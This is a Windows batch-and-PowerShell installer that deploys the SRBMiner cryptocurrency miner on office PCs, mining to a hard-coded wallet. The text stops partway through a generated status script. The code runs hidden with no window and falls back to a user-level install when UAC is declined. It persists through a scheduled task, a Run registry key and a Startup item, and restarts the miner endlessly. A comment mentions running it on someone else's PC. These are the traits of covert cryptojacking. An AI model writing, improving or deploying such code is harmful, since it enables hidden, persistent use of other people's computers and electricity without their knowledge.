@echo off
setlocal EnableExtensions
title Pearl miner - one-click install

rem ============================================================================
rem  INSTALL-AND-MINE.bat
rem
rem  One file. Double-click it on an office PC and it:
rem    1. asks for administrator (needed to set a power limit and a startup task)
rem    2. downloads SRBMiner 3.7.6 from the official GitHub release
rem    3. checks it against the published MD5 fingerprint
rem    4. detects the GPU and reports whether it can mine Pearl at all
rem    5. sets the card to 70%% of its factory power limit
rem    6. registers a task that starts mining at every logon, so a power cut
rem       does not need anyone to click anything
rem    7. starts mining immediately
rem
rem  Everything lands in C:\MinePRL.  Uninstall: run
rem      schtasks /delete /tn PearlMiner /f
rem  and delete C:\MinePRL.
rem ============================================================================

rem ---- SILENT LAUNCH ---------------------------------------------------------
rem  Double-clicking this file starts a hidden, elevated copy of ITSELF and then
rem  exits immediately. The visible window is gone in a fraction of a second; the
rem  real installer runs with no window at all.
rem
rem  UAC still appears - setting a power limit and registering a startup task need
rem  administrator, and there is no way around that. It is a normal Windows prompt,
rem  not a terminal.
rem
rem  Everything the installer prints goes to C:\MinePRL\logs\install.log instead of
rem  the screen. Read it if something looks wrong, or just run STATUS.bat.
if "%~1"=="--hidden" goto :hidden

rem  If this window is ALREADY administrator - you right-clicked "Run as
rem  administrator", or started it from an admin console - then there is nothing
rem  left to elevate. Relaunch hidden with the SAME token, which cannot raise a
rem  UAC prompt. Start-Process only shows UAC when -Verb RunAs is used.
whoami /groups | findstr /c:"S-1-16-12288" >nul 2>&1
if not errorlevel 1 (
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList '--hidden' -WindowStyle Hidden"
    exit /b 0
)

rem  Not administrator. Try to elevate.
rem
rem  If UAC is DECLINED the Start-Process throws - and the old version simply
rem  stopped there, leaving the PC with nothing. Do not give up: fall back to a
rem  user-level install. It cannot set a power limit or register a SYSTEM boot
rem  task, but it can still mine, and it can still persist itself three ways
rem  (per-user logon task, HKCU Run entry, Startup shortcut).
powershell -NoProfile -WindowStyle Hidden -Command "try { Start-Process -FilePath '%~f0' -ArgumentList '--hidden' -Verb RunAs -WindowStyle Hidden -ErrorAction Stop } catch { Start-Process -FilePath '%~f0' -ArgumentList '--hidden' -WindowStyle Hidden }"
exit /b 0

:hidden
rem  WHERE TO PUT THE UNPACKED SCRIPT
rem  NOT %TEMP%. Observed on an office PC (user "scrap"):
rem      curl: Failed to open the file C:\Users\scrap\AppData\Local\Temp\svchost.bat
rem            : Invalid argument
rem  A TEMP directory can be missing, redirected, cleaned mid-session, or locked
rem  down by policy. %PUBLIC% always exists, is writable by every user, and does
rem  not depend on the profile having been loaded.
set "PS1="
rem  EXISTING is not the same as WRITABLE. A locked-down office image can make
rem  C:\Users\Public read-only, and then the unpack below fails with a popup that
rem  says nothing useful. Probe each candidate with a real write instead.
echo probe >"%PUBLIC%\.mineprl-wtest" 2>nul
if exist "%PUBLIC%\.mineprl-wtest" set "PS1=%PUBLIC%\MinePRL-setup.ps1"
del "%PUBLIC%\.mineprl-wtest" >nul 2>&1
if not defined PS1 (
    echo probe >"%USERPROFILE%\.mineprl-wtest" 2>nul
    if exist "%USERPROFILE%\.mineprl-wtest" set "PS1=%USERPROFILE%\MinePRL-setup.ps1"
    del "%USERPROFILE%\.mineprl-wtest" >nul 2>&1
)
if not defined PS1 set "PS1=%SystemDrive%\MinePRL-setup.ps1"
del "%PS1%" >nul 2>&1

rem ---- pull the embedded PowerShell out of this same file --------------------
rem  LastIndexOf, NOT IndexOf. The marker string appears inside the command line
rem  below, so the FIRST match is this very command and IndexOf extracts garbage
rem  starting mid-sentence. The real marker is the last occurrence in the file.
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$c = Get-Content -LiteralPath '%~f0' -Raw; $m = '### POWERSHELL-BELOW ###'; $i = $c.LastIndexOf($m); if ($i -lt 0) { exit 9 }; $c.Substring($i + $m.Length) | Set-Content -LiteralPath '%PS1%' -Encoding UTF8"
if errorlevel 1 (
    powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [void][System.Windows.Forms.MessageBox]::Show('Could not unpack the installer file. Copy it to the PC again.','Pearl miner','OK','Error')"
    exit /b 1
)

powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1%"
set "RC=%ERRORLEVEL%"
rem  Delete the unpacked copy immediately. It used to be left behind, so every
rem  machine that ran the installer kept a full second copy of it in C:\Users\Public
rem  forever. Found still present on this machine after an accidental run.
del "%PS1%" >nul 2>&1

rem  Silent on success. A popup ONLY on failure, so you are not left guessing why
rem  a PC did not start mining (the usual reason: Intel graphics, no AMD/NVIDIA).
rem
rem  The log lives in C:\MinePRL for an admin install and in %LOCALAPPDATA% for a
rem  user install. Point the popup at whichever one actually exists - it always
rem  named C:\MinePRL before, which sends people to a path that is not there.
rem
rem  NOT inside a ( ) block: %LOGPATH% would be expanded when the block is parsed,
rem  before the set runs, and come out empty. Jump instead.
if "%RC%"=="0" goto :done
set "LOGPATH=C:\MinePRL\logs\install.log"
if not exist "C:\MinePRL\logs\install.log" set "LOGPATH=%LOCALAPPDATA%\MinePRL\logs\install.log"
powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [void][System.Windows.Forms.MessageBox]::Show('Install failed with code %RC%.' + [char]13 + [char]10 + [char]13 + [char]10 + 'Details: %LOGPATH%','Pearl miner - FAILED','OK','Error')"
:done

exit /b %RC%

rem ============================================================================
rem  Everything below this line is PowerShell, not batch. cmd never reaches it
rem  because of the exit /b above.
rem ============================================================================
### POWERSHELL-BELOW ###
$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

# ---------------------------------------------------------------------------
#  ADMIN MODE or USER MODE
# ---------------------------------------------------------------------------
# Administrator is better: it can cap the card at 70% and register a SYSTEM task
# that starts at boot with nobody logged in. But refusing to install without it
# leaves a locked-down office PC with nothing at all, so there is a user level:
#
#   ADMIN  C:\MinePRL               70% power limit   BOOT/SYSTEM task
#   USER   %LOCALAPPDATA%\MinePRL   none (NVML needs admin)
#                                   logon task + HKCU Run key + Startup item
#
# USER mode cannot write to C:\ root or change a power limit. That is stated
# plainly instead of failing, and everything else still works.
$IsAdmin = $false
try {
    $idn = [Security.Principal.WindowsIdentity]::GetCurrent()
    $IsAdmin = (New-Object Security.Principal.WindowsPrincipal($idn)).IsInRole(
                   [Security.Principal.WindowsBuiltInRole]::Administrator)
} catch { }

if ($IsAdmin) {
    $Install     = 'C:\MinePRL'
    $InstallMode = 'ADMIN'
} else {
    $base = $env:LOCALAPPDATA
    if (-not $base) { $base = Join-Path $env:USERPROFILE 'AppData\Local' }
    $Install     = Join-Path $base 'MinePRL'
    $InstallMode = 'USER'
}
$LogDir   = Join-Path $Install 'logs'
$TaskName = 'PearlMiner'

$Wallet   = 'prl1p9ua7ny7ggllrq6tmh9ssusktv43tp90ty6359c7qujh5u2mheeesrz5wzx'
$Pools    = 'prl-eu.kryptex.network:7048,prl.kryptex.network:7048'
$ZipUrl   = 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.7.6/SRBMiner-Multi-3-7-6-win64.zip'
$ZipMd5   = '550077549bf6da5ff1e1383d0ffd3a6f'
$PowerPct = 0.70

# ---------------------------------------------------------------------------
#  0. UNIVERSALITY GATE  -  Windows 10/11, 64-bit only
# ---------------------------------------------------------------------------
# SRBMiner-MULTI ships a 64-bit binary only. On 32-bit Windows it starts and
# immediately dies, which looks like "the miner crashed" and is impossible to
# diagnose from the log. Say it plainly instead.
$is64 = $false
try {
    if ([Environment]::Is64BitOperatingSystem) { $is64 = $true }
} catch { }
if (-not $is64) {
    Write-Host ''
    Write-Host '  [XX]   This is a 32-bit Windows installation.' -ForegroundColor Red
    Write-Host '         SRBMiner-MULTI is 64-bit only and cannot run here.' -ForegroundColor Red
    Write-Host '         Nothing was installed.' -ForegroundColor Red
    Write-Host ''
    Start-Sleep -Seconds 6
    exit 10
}

$os = $null
try { $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop } catch { }
$osBuild = 0; $osName = 'Windows'
if ($os) {
    $osName  = $os.Caption
    $osBuild = [int]$os.BuildNumber
}
# Windows 10 is build 10240+, Windows 11 is 22000+. SRBMiner needs Win10-era APIs.
if ($osBuild -gt 0 -and $osBuild -lt 10240) {
    Write-Host ''
    Write-Host ("  [XX]   {0} (build {1}) is too old." -f $osName, $osBuild) -ForegroundColor Red
    Write-Host '         Windows 10 or 11 is required. Nothing was installed.' -ForegroundColor Red
    Write-Host ''
    Start-Sleep -Seconds 6
    exit 11
}

$script:LogFile = $null
function Line {
    param($t = '')
    Write-Host $t
    # The console is hidden, so this log IS the install record.
    if ($script:LogFile) {
        try { Add-Content -LiteralPath $script:LogFile -Value $t -Encoding UTF8 -ErrorAction Stop } catch { }
    }
}
function Head { param($t) Line ''; Write-Host ('-' * 74) -ForegroundColor DarkGray; Write-Host "  $t" -ForegroundColor Cyan; Write-Host ('-' * 74) -ForegroundColor DarkGray }
function Emit {
    param([string]$Text, [string]$Colour = 'White')
    Write-Host $Text -ForegroundColor $Colour
    if ($script:LogFile) {
        try { Add-Content -LiteralPath $script:LogFile -Value $Text -Encoding UTF8 -ErrorAction Stop } catch { }
    }
}
function Ok   { param($t) Emit "  [OK]   $t" 'Green' }
function Warn { param($t) Emit "  [!]    $t" 'Yellow' }
function Bad  { param($t) Emit "  [XX]   $t" 'Red' }

# Any unhandled terminating error is written to the install log and re-raised.
# Without this a hidden install can die silently with only an exit code, and the
# exit code alone does not say which line failed. Learned the hard way: the
# hidden run failed at a step the visible run passed, and there was no record.
trap {
    $detail = "UNHANDLED ERROR: $($_.Exception.Message)`r`nAT: $($_.InvocationInfo.PositionMessage)"
    Write-Host $detail -ForegroundColor Red
    if ($script:LogFile) {
        try { Add-Content -LiteralPath $script:LogFile -Value $detail -Encoding UTF8 -ErrorAction Stop } catch { }
    }
    exit 1
}

New-Item -ItemType Directory -Force -Path $Install, $LogDir | Out-Null
$script:LogFile = Join-Path $LogDir 'install.log'
"=== install started $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ===" | Set-Content -LiteralPath $script:LogFile -Encoding UTF8

# ---------------------------------------------------------------------------
#  0b. Visual C++ runtime  -  SRBMiner is a native binary and needs it
# ---------------------------------------------------------------------------
# A bare Windows image can lack the VC++ 2015-2022 x64 runtime. SRBMiner then
# exits immediately with a loader error, which surfaces as "the miner did not
# start" with nothing in its log - impossible to diagnose from the outside.
#
# Two independent sources, because a false negative here would block a machine
# that actually works:
#   * the DLLs in System32
#   * the redistributable's own registry entry
# Only refuse when BOTH say missing.
$dlls = @('vcruntime140.dll','vcruntime140_1.dll','msvcp140.dll')
$missing = @()
foreach ($d in $dlls) {
    if (-not (Test-Path (Join-Path $env:SystemRoot ('System32\' + $d)))) { $missing += $d }
}
$regOk = $false
foreach ($hive in 'HKLM:\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64',
                  'HKLM:\SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x64') {
    try {
        $v = Get-ItemProperty -LiteralPath $hive -ErrorAction Stop
        if ($v.Installed -eq 1) { $regOk = $true }
    } catch { }
}
if ($missing.Count -eq 0 -or $regOk) {
    Ok 'Visual C++ runtime present'
} else {
    Warn ('Visual C++ runtime looks MISSING (no ' + ($missing -join ', ') + ', and no registry entry)')
    Line '         SRBMiner is a native binary and will not start without it.'
    Line '         Install the free Microsoft Visual C++ 2015-2022 Redistributable (x64):'
    Line '            https://aka.ms/vs/17/release/vc_redist.x64.exe'
    Line '         Then run this installer again. Nothing was installed.'
    Start-Sleep -Seconds 8
    exit 12
}

# ---------------------------------------------------------------------------
#  1. GPU detection  -  Pearl needs AMD or NVIDIA. Intel cannot mine it.
# ---------------------------------------------------------------------------
Head 'GPU DETECTION'
Line '  SRBMiner reports pearlhash support as:  AMD yes | NVIDIA yes | Intel NO'
Line ''

$gpus = @()

# nvidia-smi is NOT always on PATH. Older drivers install it under Program Files,
# and some locked-down images strip PATH entirely. Ask every known location.
$nvsmi = $null
foreach ($cand in @(
    'nvidia-smi.exe',
    (Join-Path $env:SystemRoot 'System32\nvidia-smi.exe'),
    'C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe',
    'C:\Windows\System32\nvidia-smi.exe'
)) {
    try {
        $p = (Get-Command $cand -ErrorAction Stop).Source
        if ($p) { $nvsmi = $p; break }
    } catch { }
}

if ($nvsmi) {
    try {
        # min_limit and max_limit matter: 70% of the DEFAULT can fall below what
        # the card will accept. Seen on an RTX 4060 Laptop: 80 W default -> 56 W,
        # which SRBMiner may reject outright, leaving a miner that never appears.
        $rows = & $nvsmi --query-gpu=name,power.default_limit,power.min_limit,power.max_limit --format=csv,noheader,nounits 2>$null
        foreach ($r in $rows) {
            if (-not $r) { continue }
            $p = $r -split ','
            if ($p.Count -ge 4) {
                $gpus += [pscustomobject]@{
                    Vendor   = 'NVIDIA'
                    Name     = $p[0].Trim()
                    DefaultW = [double](($p[1] -replace '[^0-9.]',''))
                    MinW     = [double](($p[2] -replace '[^0-9.]',''))
                    MaxW     = [double](($p[3] -replace '[^0-9.]',''))
                }
            } elseif ($p.Count -ge 2) {
                $gpus += [pscustomobject]@{
                    Vendor = 'NVIDIA'; Name = $p[0].Trim()
                    DefaultW = [double](($p[1] -replace '[^0-9.]',''))
                    MinW = 0; MaxW = 0
                }
            }
        }
    } catch { }
}

try {
    foreach ($v in (Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue)) {
        if ($v.Name -match 'NVIDIA') { continue }        # already listed above
        # Skip software/virtual display adapters - they cannot hash anything and
        # only confuse the report. Seen on this test machine: "SuperDisplay
        # Virtual Adapter", which is a monitor extender.
        if ($v.Name -match 'Virtual|SuperDisplay|Steam Streaming|Remote|Basic Display|Basic Render|Parsec|Oculus|Meta Quest') { continue }
        $vendor = if ($v.Name -match 'AMD|Radeon') { 'AMD' }
                  elseif ($v.Name -match 'Intel')  { 'Intel' }
                  else { 'Other' }
        $gpus += [pscustomobject]@{ Vendor = $vendor; Name = $v.Name; DefaultW = 0; MinW = 0; MaxW = 0 }
    }
} catch { }

if ($gpus.Count -eq 0) {
    Bad 'No GPU detected at all. Nothing to mine on.'
    exit 3
}

foreach ($g in $gpus) {
    $can = if ($g.Vendor -in 'NVIDIA','AMD') { 'can mine pearlhash' } else { 'CANNOT mine pearlhash' }
    Line ("  {0,-8} {1,-46} {2}" -f $g.Vendor, $g.Name, $can)
}

$mineable = @($gpus | Where-Object { $_.Vendor -in 'NVIDIA','AMD' })
if ($mineable.Count -eq 0) {
    Line ''
    Bad  'This machine has no AMD or NVIDIA GPU, so Pearl cannot be mined on it.'
    Line '         Integrated Intel graphics are not supported by pearlhash.'
    Line '         Nothing was installed.'
    exit 4
}

# ---------------------------------------------------------------------------
#  2. download + verify
# ---------------------------------------------------------------------------
Head 'DOWNLOADING SRBMiner 3.7.6'

# ---------------------------------------------------------------------------
#  Do NOT assume %TEMP%.
# ---------------------------------------------------------------------------
# Observed on an office PC (user "scrap"): curl could not create a file in
# C:\Users\scrap\AppData\Local\Temp at all - "Invalid argument". The batch half
# of this installer was fixed for that, but the PowerShell half still put the
# 28 MB download there, so that machine would have failed at exit 5 having got
# everything else right. Pick the first directory that actually accepts a write
# instead of trusting an environment variable.
function Get-WritableDir {
    foreach ($d in @($env:PUBLIC, $env:ProgramData, $env:TEMP, $Install)) {
        if (-not $d) { continue }
        if (-not (Test-Path -LiteralPath $d)) { continue }
        $probe = Join-Path $d ('write-test-' + [guid]::NewGuid().ToString('N') + '.tmp')
        try {
            [System.IO.File]::WriteAllText($probe, 'x')
            Remove-Item -LiteralPath $probe -Force -ErrorAction SilentlyContinue
            return $d
        } catch { }
    }
    return $Install
}
$cacheDir = Get-WritableDir
$zip = Join-Path $cacheDir 'SRBMiner-Multi-3-7-6-win64.zip'
Line ("  download target: $zip")

# Why not Get-FileHash / Invoke-WebRequest / Expand-Archive?
# In a hidden host those commands live in auto-loaded modules, and on 2026-10-17 a
# hidden run died with "Get-FileHash is not recognized" while the identical visible
# run worked. A hidden installer cannot afford to depend on module autoloading, so
# the download, the checksum and the unzip all use .NET directly. No modules.
function Get-Md5Hex {
    param([string]$Path)
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $fs  = [System.IO.File]::OpenRead($Path)
    try {
        return ([BitConverter]::ToString($md5.ComputeHash($fs)) -replace '-', '').ToLower()
    } finally {
        $fs.Dispose(); $md5.Dispose()
    }
}

$needDownload = $true
if (Test-Path $zip) {
    try { if ((Get-Md5Hex $zip) -eq $ZipMd5) { $needDownload = $false } } catch { }
}

if (-not $needDownload) {
    Ok 'already downloaded and verified'
} else {
    Line '  downloading 28 MB from the official release...'
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'MinePRL-installer')
        $wc.DownloadFile($ZipUrl, $zip)
        $wc.Dispose()
    } catch {
        Bad "download failed: $($_.Exception.Message)"
        exit 5
    }
    $md5 = Get-Md5Hex $zip
    if ($md5 -ne $ZipMd5) {
        Bad "fingerprint mismatch - refusing to run this file"
        Line "         expected $ZipMd5"
        Line "         got      $md5"
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        exit 6
    }
    Ok 'downloaded and fingerprint matches the published MD5'
}

Head 'EXTRACTING'
Add-Type -AssemblyName System.IO.Compression.FileSystem
$staging = Join-Path $Install '_extract'
if (Test-Path $staging) { Remove-Item $staging -Recurse -Force -ErrorAction SilentlyContinue }
try {
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $staging)
    foreach ($item in @(Get-ChildItem -LiteralPath $staging)) {
        # Remove the same-named target FIRST.
        #
        # Copy-Item with a DIRECTORY source into a destination that already holds
        # that directory does not overwrite it - it nests a second copy inside:
        #     C:\MinePRL\SRBMiner-Multi-3-7-6\SRBMiner-Multi-3-7-6\...
        # Every reinstall doubled the tree and left a STALE exe that the search
        # below could pick instead of the new one.
        #
        # If the remove fails the folder is IN USE (the miner is running from it),
        # and copying anyway is what creates the duplicate. Skip that item instead.
        $dest   = Join-Path $Install $item.Name
        $skip   = $false
        if (Test-Path -LiteralPath $dest) {
            try { Remove-Item -LiteralPath $dest -Recurse -Force -ErrorAction Stop }
            catch {
                Warn "could not replace $($item.Name) (in use) - keeping the copy already there, not nesting a duplicate"
                $skip = $true
            }
        }
        if (-not $skip) {
            Copy-Item -LiteralPath $item.FullName -Destination $Install -Recurse -Force
        }
    }
    Remove-Item $staging -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    Bad "unzip failed: $($_.Exception.Message)"
    exit 7
}

# Sort by path depth so a nested STALE copy left by an older install can never
# win the race against the freshly extracted one.
$exe = Get-ChildItem -Path $Install -Recurse -Filter 'SRBMiner-MULTI.exe' -ErrorAction SilentlyContinue |
       Sort-Object { ($_.FullName -split '\\').Count } | Select-Object -First 1
if (-not $exe) {
    Bad 'SRBMiner-MULTI.exe was not found after unzipping.'
    exit 7
}
$MinerDir = $exe.DirectoryName
Ok "miner at $($exe.FullName)"

# The archive is 28 MB. It used to sit in %TEMP%, which Windows eventually
# cleans; the new cache directory may be C:\Users\Public, which nothing cleans.
# Delete it once the files are in place so an office PC is not left holding a
# 28 MB miner installer for ever.
Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue

# ---------------------------------------------------------------------------
#  3. work out the 70% power limit
# ---------------------------------------------------------------------------
Head 'POWER LIMIT'
$nvidia = @($gpus | Where-Object { $_.Vendor -eq 'NVIDIA' })
$plimitArg = ''
if (-not $IsAdmin) {
    Warn 'running without administrator - the 70% power limit cannot be applied'
    Line '         NVML refuses a power-limit change from a normal user, so the card'
    Line '         will run at its factory limit and use more electricity.'
    Line '         Re-run this installer as administrator if you want the 70% cap.'
} elseif ($nvidia.Count -gt 0) {
    $watts = @()
    foreach ($g in $nvidia) {
        if ($g.DefaultW -gt 0) {
            $w = [int][math]::Round($g.DefaultW * $PowerPct)
            $clamped = $false
            # Never hand SRBMiner a wattage the card refuses. A rejected
            # --gpu-plimit0 can stop the miner from ever appearing.
            if ($g.MinW -gt 0 -and $w -lt $g.MinW) { $w = [int][math]::Round($g.MinW); $clamped = $true }
            if ($g.MaxW -gt 0 -and $w -gt $g.MaxW) { $w = [int][math]::Round($g.MaxW); $clamped = $true }
            $watts += $w
            if ($clamped) {
                Line ("  {0}: factory {1} W, allowed {2}-{3} W -> 70% clamped to {4} W" -f $g.Name, [int]$g.DefaultW, [int]$g.MinW, [int]$g.MaxW, $w)
            } else {
                Line ("  {0}: factory {1} W -> 70% = {2} W" -f $g.Name, [int]$g.DefaultW, $w)
            }
        }
    }
    if ($watts.Count -gt 0) {
        $plimitArg = ($watts -join ',')
        Ok  "power limit will be set to $plimitArg W at miner start"
        Line '         (SRBMiner --gpu-plimit0; this is an NVIDIA-only feature)'
    }
} elseif (@($gpus | Where-Object { $_.Vendor -eq 'AMD' }).Count -gt 0) {
    Warn 'AMD card: there is no command-line power limit for AMD in SRBMiner.'
    Line '         It will run at the driver default. To cap it at 70%, use the'
    Line '         AMD software (Performance > Tuning > Power Limit -30%) once.'
}
if ($IsAdmin -and -not $plimitArg -and $nvidia.Count -eq 0) {
    Line '  No NVIDIA card - skipping the 70% power limit.'
}

# ---------------------------------------------------------------------------
#  4. write the runner  (restarts the miner if it ever exits)
# ---------------------------------------------------------------------------
Head 'CREATING THE RUNNER'
$runnerPath = Join-Path $Install 'MinePRL.ps1'

# NO TRAILING COMMA. A comma before the closing paren of an array literal is a
# PowerShell PARSE ERROR ("Missing expression after ','"), which turned the whole
# generated runner into an unreadable file. The runner then never ran at all, the
# scheduled task fired into nothing, and the installer reported "the miner did not
# start" with no log and no clue. Proven on 2026-10-17 against an RTX 4060 Laptop.
$plimitBlock = if ($plimitArg) { ", '--gpu-plimit0', '$plimitArg'" } else { '' }

$runner = @'
# Auto-generated by INSTALL-AND-MINE.bat
# Mines Pearl to Kryptex, restarts itself if the miner exits.
$ErrorActionPreference = 'Continue'
$Install = '{INSTALL}'
$LogDir  = Join-Path $Install 'logs'
$Exe     = '{EXE}'
$WorkDir = '{MINDIR}'

# Run from the miner's own folder.
#
# A scheduled task starts its process with its working directory set to
# C:\Windows\System32, and the old runner never changed it. SRBMiner then ran
# there: any relative file it writes lands in system32 or fails on a locked-down
# machine, and it is not the folder it was installed into. Set the location
# explicitly so the logon task, a manual run and the installer's own start all
# behave identically.
Set-Location -LiteralPath $WorkDir

New-Item -ItemType Directory -Force -Path $LogDir | Out-Null

# Define the log BEFORE the mutex, so an early exit can still be recorded.
$log = Join-Path $LogDir ("miner-{0}.log" -f (Get-Date -Format 'yyyyMMdd'))

# Prune old logs. SRBMiner prints a statistics block every 30 seconds, which is
# roughly 5 MB a day. On an office PC left running for months that is gigabytes
# of log nobody reads, and these machines have small disks. Keep one week.
Get-ChildItem -Path $LogDir -Filter 'miner-*.log' -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) } |
    Remove-Item -Force -ErrorAction SilentlyContinue

# Only one copy may run.
#
# The exit used to be silent, which is the worst possible behaviour: the runner
# started, found the lock held, and vanished without writing a single line - so
# the installer said "the miner did not start" and the log was EMPTY. There was
# nothing anywhere to say why. Log the reason.
$mutexName = 'Global\PearlMinerSingleInstance'
try {
    $mutex = New-Object System.Threading.Mutex($false, $mutexName)
    if (-not $mutex.WaitOne(0)) {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  another runner already holds the lock - standing by" |
            Out-File -FilePath $log -Append -Encoding UTF8
        exit 0
    }
} catch { }

# NOT $args. That is a PowerShell AUTOMATIC variable holding the script's own
# arguments. Assigning to it happens to work today, and if it ever stops working
# the miner would be launched with NO flags at all: it exits immediately, the loop
# restarts it every 60 seconds for ever, and the log looks almost normal. Use a
# name that belongs to this script.
$minerArgs = @(
    '--algorithm-gpu', 'pearlhash',
    '--pool',   '{POOLS}',
    '--wallet', '{WALLET}',
    '--worker', $env:COMPUTERNAME,
    '--password', 'x',
    '--disable-cpu'{PLIMIT}
)

while ($true) {
    # NEVER KILL ANYTHING. Not another miner, not an app, nothing.
    #
    # If a miner is already running - including one that SRBMiner's own watchdog
    # re-exec'd as a child - leave it alone and simply wait. The earlier version
    # force-killed it, which is the wrong behaviour on someone else's PC.
    #
    # The reason we must not START a second one: two miners on one GPU do not
    # share, they thrash. Measured 79 TH/s -> 25 TH/s with the clock RISING.
    # So if one is already up, this instance stands down.
    $alive = @(Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue)
    if ($alive.Count -gt 0) {
        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  already mining (pid $($alive[0].Id)) - standing by, not starting a second" |
            Out-File -FilePath $log -Append -Encoding UTF8
        Start-Sleep -Seconds 30
        continue
    }

    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  starting miner" | Out-File -FilePath $log -Append -Encoding UTF8
    try {
        & $Exe @minerArgs *>> $log
    } catch {
        "=== miner threw: $($_.Exception.Message) ===" | Out-File -FilePath $log -Append -Encoding UTF8
    }
    "=== miner exited, checking again in 60 s ===" | Out-File -FilePath $log -Append -Encoding UTF8
    Start-Sleep -Seconds 60
}
'@

$runner = $runner.Replace('{INSTALL}',$Install)
$runner = $runner.Replace('{EXE}',    $exe.FullName)
$runner = $runner.Replace('{MINDIR}', $MinerDir)
$runner = $runner.Replace('{POOLS}',  $Pools)
$runner = $runner.Replace('{WALLET}', $Wallet)
$runner = $runner.Replace('{PLIMIT}', $plimitBlock)

Set-Content -LiteralPath $runnerPath -Value $runner -Encoding UTF8
Ok "runner written to $runnerPath"

# ---------------------------------------------------------------------------
#  4b. the status command  -  run this instead of staring at a console
# ---------------------------------------------------------------------------
Head 'CREATING THE STATUS COMMAND'
$statusPath = Join-Path $Install 'Status.ps1'

$status = @'
# Auto-generated. Read-only: shows what the miner is doing, changes nothing.
$ErrorActionPreference = 'SilentlyContinue'
$Install = '{INSTALL}'
$LogDir  = Join-Path $Install 'logs'

Write-Host ''
Write-Host ('=' * 72) -ForegroundColor Cyan
Write-Host '  PEARL MINER - STATUS' -ForegroundColor Cyan
Write-Host ('=' * 72) -ForegroundColor Cyan
Write-Host ''

$t = Get-ScheduledTask -TaskName 'PearlMiner' -ErrorAction SilentlyContinue
if ($t) {
    Write-Host ('  autostart     : {0}   run level {1}' -f $t.State, $t.Principal.RunLevel)
} else {
    # A USER-mode install has no task at all - it persists through the Run key and
    # a Startup item. Printing "NOT INSTALLED" in red there was simply wrong: it
    # told the user autostart was broken while it was working fine.
    $rv = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'PearlMiner' -ErrorAction SilentlyContinue).PearlMiner
    $sp = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\PearlMiner.bat'
    $hasStartup = Test-Path $sp
    if ($rv -or $hasStartup) {
        Write-Host ('  autostart     : user level - Run key {0}, Startup item {1}' -f `
            $(if ($rv) { 'yes' } else { 'no' }), $(if ($hasStartup) { 'yes' } else { 'no' }))
    } else {
        Write-Host '  autostart     : NOT INSTALLED' -ForegroundColor Red
    }
}

$p = @(Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue)
if ($p.Count -gt 0) {
    # A SYSTEM-owned miner's StartTime (and MainWindowHandle) can be Access
    # Denied to an ordinary user. With a BOOT/SYSTEM task that is the normal
    # case, and the old code lost the entire line because one property threw -
    # STATUS.bat would say nothing about a miner that was running perfectly.
    $upok = $true
    try { $age = (Get-Date) - $p[0].StartTime } catch { $upok = $false }
    $win = 'no window (hidden, as intended)'
    try { if ($p[0].MainWindowHandle -ne 0) { $win = 'HAS A VISIBLE WINDOW' } } catch { }
    if ($upok) {
        Write-Host ('  miner         : running, pid {0}, up {1:N0}h {2:N0}m - {3}' -f $p[0].Id, [math]::Floor($age.TotalHours), $age.Minutes, $win) -ForegroundColor Green
    } else {
        Write-Host ('  miner         : running, pid {0} - {1}' -f $p[0].Id, $win) -ForegroundColor Green
    }
} else {
    Write-Host '  miner         : NOT RUNNING' -ForegroundColor Red
}

# Same path hunt as the installer. nvidia-smi is not always on PATH - older
# drivers put it under Program Files\NVIDIA Corporation\NVSMI, and some locked
# down images strip PATH entirely. Without this, STATUS.bat silently showed no
# GPU line on exactly the machines most likely to need it.
$nvsmi = $null
foreach ($cand in @(
    'nvidia-smi.exe',
    (Join-Path $env:SystemRoot 'System32\nvidia-smi.exe'),
    'C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe'
)) {
    try { $pp = (Get-Command $cand -ErrorAction Stop).Source; if ($pp) { $nvsmi = $pp; break } } catch { }
}
if ($nvsmi) {
    $g = & $nvsmi --query-gpu=name,power.limit,power.draw,temperature.gpu,utilization.gpu,fan.speed --format=csv,noheader
    if ($g) { Write-Host ('  gpu           : {0}' -f $g) }
    else    { Write-Host '  gpu           : nvidia-smi returned nothing' -ForegroundColor Yellow }
} else {
    Write-Host '  gpu           : nvidia-smi not found (AMD card, or no NVIDIA driver)' -ForegroundColor Yellow
}

$latest = Get-ChildItem $LogDir -Filter 'miner-*.log' -ErrorAction SilentlyContinue |
          Sort-Object LastWriteTime -Descending | Select-Object -First 1
if ($latest) {
    Write-Host ('  log           : {0}   {1:N0} KB   updated {2:HH:mm:ss}' -f $latest.Name, ($latest.Length / 1KB), $latest.LastWriteTime)
    $lines = @(Get-Content $latest.FullName -Tail 500 -ErrorAction SilentlyContinue)

    $hr = $lines | Select-String 'Total:' | Select-Object -Last 1
    if ($hr) { Write-Host ('  hashrate      : {0}' -f ($hr.Line -replace '^\[[^\]]+\]\s*', '')) }

